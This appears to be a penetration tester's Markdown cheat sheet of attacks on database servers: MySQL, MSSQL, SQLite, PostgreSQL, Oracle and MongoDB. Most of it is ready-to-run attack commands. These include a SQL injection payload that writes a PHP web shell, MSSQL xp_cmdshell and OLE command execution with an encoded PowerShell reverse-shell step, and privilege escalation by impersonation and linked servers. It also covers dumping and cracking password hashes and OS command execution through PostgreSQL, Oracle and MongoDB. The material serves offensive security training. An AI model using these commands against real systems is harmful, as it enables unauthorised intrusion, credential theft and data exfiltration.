---
layout: blank
pagetitle: Database Attacks
---

## General Database viewer tools
- Use `dbeaver` on kali, has a nice GUI and everything

## MySQL
- MariaDB is an open-source fork
- `mysql -u {username} -p -h {host IP} -P {port}`
- Specifying multiple parameters `SELECT user, authentication_string FROM mysql.user WHERE user = '{username}'`
- Enumeration:
	- List all databases: `SELECT * FROM information_schema.tables;` (or `show databases;`)
    	- Use a database with `use {db_name};` and enum tables with `show tables;`
	- Version: `SELECT @@version;`
	- Current user: `SELECT system_user();`
- MySQL RCE via SQLi
	- Use the `INTO OUTFILE` to create a PHP/JSP/ASPX/etc shell
		- Example: `' UNION SELECT "<?php system('whoami');?>", null, null INTO OUTFILE "/var/www/html/tmp/shell.php" -- // `
			- `tmp` is important, because we might not have perms for `/html`
		- Then, either LFI the new file or straight up access it if possible
	- Can also extract users/passwords and crack hashes
	- Could search up phpmyadmin version to get RCE (LFI + session cookie can lead to RCE)
- Dumping MySQL: `mysqldump -h [host] -u [user] -p[password] --all-databases > mysql_all_dbs.sql`
- If we're able to log in as the `mysql` user, we can sometimes read the `/var/lib/mysql/mysql/user.MYD` file containing the root password hash
  - The password will be split into two parts, one following `root*` and the other at the bottom of the file
    - Putting these together will yield something like `root:*{combined_password}` which can be cracked with `john`
  - Can do sometimes do something similar with `SELECT load_file('{file}');` as the root mysql user


## MSSQL
- Database management built into Windows
	- `master` database for system-level details, `msdb` database for scheduling alerts/jobs, `model` database acts as blueprint for new mssqlservers, `resource` database for hosting system objects in read-only fashion, `tempdb` database as temporary storage area
	- Users vs. logins
		- Both users and logins are required to perform database operations
		- Users dictate who can access the SQL server instance as a whole (but this doesn't provide any database access)
			- These can be local database users, like `sa`, local Windows users, or Domain users
			- Thus, a valid user without any database logins wouldn't be able to do anything, despite having credentials to access the server
		- Logins provide users access to specific databases within the server
- Controlled via `Invoke-Sqlcmd`
  - `Install-Module -Name SqlServer -Force`
  - `Invoke-Sqlcmd -ServerInstance localhost\{SQL_server_name} -Database {database_like_master} -Query {query}`
- Importing [PowerUPSQL](https://github.com/NetSPI/PowerUpSQL) can give some useful Powershell commands, like `Get-SQLInstanceLocal` to identify local mssql servers
  - Cheatsheet: [https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
  - `Get-SQLServerPasswordHash` gets SQL server login passwords
  - Inspecting linked servers: `Get-SQLServerLink` 
    	- With auth: `-Username {mssql_username} -Password {mssql_password}  -Instance {server_name} -Verbose`
- **Impacket's MSSqlClient** 
	- Kali has the very useful `impacket-mssqlclient` to connect to MSSQL databases
	- `impacket-mssqlclient {database_username}:{password}@{host IP}`
		- `-windows-auth` allows us to authenticate with windows credentials; `-k` to use `.ccache` kerberos auth 
	- **Command Execution**
		- Can use `enable_xp_cmdshell` and `xp_cmdshell {command}` to execute commands on the underlying server
		- Can also use the blind `sp_start_job {command}` to execute commands, or the `sp_OACreate` method described below
		- Turn this execution into a reverse shell with the python reverse shell generator in Miscellaneous notes
			- `xp_cmdshell "powershell -exec bypass -enc {b64_payload}"`
	- **Password Hashes**
		- Get local database password hashes with `select name,password_hash from sys.sql_logins`
			- Ignore `##MS##` hashes, since they're usually disabled (can be checked in `sys.sql_logins`) and the passwords are random
		- Can be cracked with hashcat, but they need to be reorganized
			- Stored in `b'0200 + 4-byte salt + 64-byte SHA512 hash'` structure, and we need it in `0x{hex}` format, so just remove byte string indicators and add `0x` at the front
			- Then crack with `hashcat -m 1731`
	- **Impersonation**
		- We can use `enum_impersonate` to see who our current user can impersonate (`grantor` category)
			- We can enumerate both users and logins with `exec_as_user {user}` or `exec_as_login {login}` on their own, which will drop us into a shell as that user/in that database
				- If the authorized user or login is a domain user, we can pass the domain with `exec_as_{user/login} {domain}\{user}`
			- From this point, we should run `enum_impersonate` again to see if our new user can impersonate anyone
		- Our target would be to impersonate either the `sa` user, an equivalently-privileged user, or a `dbo` login of the `system` database
			- The `dbo` login stands for Database Owner and gives full control over that database
	- **Linked servers**
		- After enumerating all accessible users, we can enumerate linked mssql servers with `enum_links`
		- This will show us what linked servers our current user can use
			- This will show which users have remote login permissions
				- If local login `NULL` has a remote login, we can just execute queries without auth
				- What will be more likely is a user that has impersonation rights with a remote login on another server
					- Thus, we can log in as that user to the mssql server, run `use_link {server_name}`, and then interact with the database normally
					- The `sa` user won't show any explicit links, since they're able to impersonate any user with a link
						- Thus, if there's a user with access to a linked database, we can simply impersonate them using `sa`
			- Running `enum_links` as `sa` (or equivalent) will show all user links, allowing different chains
		- Can run basic queries as authorized users with `SELECT * FROM OPENQUERY( {linked_server_name}, '{query}')`
- List all databases: 
	- `SELECT name FROM sys.databases;`
	- Then, `SELECT * FROM {database name from first query}.information_schema.tables;`
	- This returns the tables within that database, which we can query from with `SELECT * from {database name}.dbo.{table name}`
		- `dbo` is a table schema
- Enabling `xp_cmdshell`:
	- After opening SQL terminal, can run EXECUTE commands using xp_cmdshell
		- This can be enabled by a user with permissions with 
			- `EXECUTE sp_configure 'show advanced options', 1; `
				- Showing advanced options is actually required to run xp_cmdshell
			- `RECONFIGURE;` 
			- `EXECUTE sp_configure 'xp_cmdshell', 1;`
			- `RECONFIGURE;`
		- Then, pass arbitrary commands with `EXECUTE xp_cmdshell 'whoami';`
- Can also use `sp_OACreate` to execute system commands:
	- `sp_configure 'show advanced options', 1;`
	- `RECONFIGURE;` 
	- `sp_configure 'Ole Automation Procedures', 1;`
	- `RECONFIGURE;`
	- `DECLARE @shell INT; EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT; EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c {command}';`
- Dumping MSSQL (table names): `Invoke-Sqlcmd -ServerInstance [server] -Username [user] -Password [password] -Query "SELECT name FROM master.sys.databases" | Format-Table -AutoSize > mssql_dbs.txt`

## SQLite
- Use `sqlitebrowser` for viewing sqlite databases visually 
  - If we want to quickly view a db, we can just `sqlite3 {db_file}`
- Enumeration:
  - We can view version with `.version`, databases with `.databases`, tables with `.tables`
- Can't execute functions, but can load malicious files
	- `SELECT load_extension('/tmp/malicious.so');`
	- Outdated versions may have RCE CVEs
- `SQLite CLI` allows command execution with `.shell {command}` or `.system {command}`
- We can read files with `.read {filename}`

## PostgreSQL
- Use `psql -U {username}` for to connect to PostgreSQL databases (with `-d {db_name}` for a database)
  - Then, we can list databases with `\l` and use `\c {db_name}` to connect to the database
  - `\d` to list the tables once connected
- Yoink hashes
  - `SELECT usename, passwd FROM pg_shadow;`
  - `SELECT * FROM pg_authid;`
  - Crack with `-m 28600` on hashcat
- Command execution with `COPY (SELECT '') TO PROGRAM 'bash -c "whoami"';`
	- Requires superuser
- Command execution with `SELECT pg_execute_server_program('id');`
	- This won't require superuser, but will require `pg_execute_server_program`
- Dumping PostgreSQL: `pg_dump -h [host] -U [username] -F c -b -v -f postgresql_all.dump postgres`
- Read files using `COPY`
  - Start by creating a table with `CREATE TABLE demo(t text);`
  - Then `COPY demo FROM '{filename}';`, and then we can just read from the demo table

## Oracle
- Comand execution with `EXEC dbms_java.runjava('java.lang.Runtime.getRuntime().exec("{command}")');`
- Dumping Oracle: `sqlplus [username]/[password]@[host]/[SID] @extract.sql > oracle_data.txt`

## MongoDB
- Dumping MongoDB: `mongodump --host [host] --port [port] --username [user] --password [password] --out ./mongodb_dump`
- Connecting to a MongoDB: use `mongosh` or `mongo`
  - `mongo --host {IP}:{port} -u {username} -p {password} --authenticationDatabase {database_with_auth_info} ({database_to_use})`
- Get user hashes and format for cracking:
```
use admin
db.system.users.find().forEach(function(u) {
    print(u.user + ":" + u.credentials["SCRAM-SHA-1"].storedKey);
})
```
- Search for sensitive info:
```
db.getCollectionNames().filter(c => 
    c.match(/user|password|credential|token|key|secret|admin/i)
)
```
- Command execution with `db.collection.find({$where: "{command} || true"})`
- Alternatively:
```
db.collection.find({$where: function() {
    var cmd = "whoami";
    var output = run("bash", "-c", cmd);
    return true;
}})
```
- Can also try `runCommand()`
```
db.runCommand({
    eval: "function() { return run('whoami'); }",
    nolock: true
})
```